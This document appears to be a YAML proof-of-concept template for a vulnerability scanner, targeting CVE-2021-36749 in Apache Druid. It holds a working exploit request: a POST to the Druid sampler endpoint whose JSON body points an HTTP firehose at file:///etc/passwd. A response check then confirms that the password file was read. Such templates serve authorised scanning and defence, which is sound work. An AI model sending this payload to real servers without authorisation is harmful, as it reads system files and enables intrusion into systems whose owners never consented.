name: yaml-poc-apache-druid-other-CVE-2021-36749
binding: a758b561-39ee-491f-9c6a-c31488b0753d
detail:
    author: system_user
    links:
        - https://lists.apache.org/thread.html/r304dfe56a5dfe1b2d9166b24d2c74ad1c6730338b20aef77a00ed2be%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/r304dfe56a5dfe1b2d9166b24d2c74ad1c6730338b20aef77a00ed2be@%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/rc9400a70d0ec5cdb8a3486fc5ddb0b5282961c0b63e764abfbcb9f5d%40%3Cdev.druid.apache.org%3E
        - https://nvd.nist.gov/vuln/detail/CVE-2021-36749
    vulnerability:
        id: 5c42b46b-7fa8-43be-ae11-9871730ec7ea
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /druid/indexer/v1/sampler?for=connect
            headers:
                Content-Type: application/json
            body: |
                {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
